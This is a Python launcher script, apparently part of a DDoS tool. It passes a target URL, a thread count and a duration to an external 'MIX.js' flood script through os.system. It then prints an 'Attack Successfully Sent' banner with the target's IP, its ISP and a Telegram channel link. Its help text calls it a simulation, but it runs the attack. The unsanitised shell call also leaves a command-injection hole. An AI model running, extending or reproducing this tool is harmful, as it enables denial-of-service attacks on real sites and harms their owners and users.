def main(url, threads, time):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M')

    # Bersihkan URL dari http:// atau https://
    cleaned_url = clean_url(url)

    # Mendapatkan IP address dari URL yang sudah dibersihkan
    ip_address = get_ip(cleaned_url)

    # Jika berhasil mendapatkan IP, maka lanjut ke pengecekan ISP
    if ip_address != "Unable to get IP address":
        isp_info = get_isp(ip_address)
    else:
        isp_info = "Unable to retrieve ISP information"

    print(f"   Target Details :")
    print(f"        \x1b[38;2;233;233;233mSTATUS  : [ \x1b[38;2;0;212;14mAttack Successfully Sent By Actrotophiles \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{args.target} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mIP      : [ \x1b[38;2;0;255;255m{ip_address} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{args.threads} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{args.time} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mRAZ \x1b[38;2;233;233;233m]")
    print(f"   Attack Details :")
    print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTELE   : [ \x1b[38;2;0;255;255mt.me/neverdowns \x1b[38;2;233;233;233m]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simulate an attack command.')
    parser.add_argument('target', type=str, help='URL to attack')
    parser.add_argument('threads', type=int, help='Number of threads to use')
    parser.add_argument('time', type=int, help='Time duration of attack')

    args = parser.parse_args()

    os.system(f'node MIX.js {args.target} {args.threads} {args.time}')
    
    main(args.target, args.threads, args.time)
    
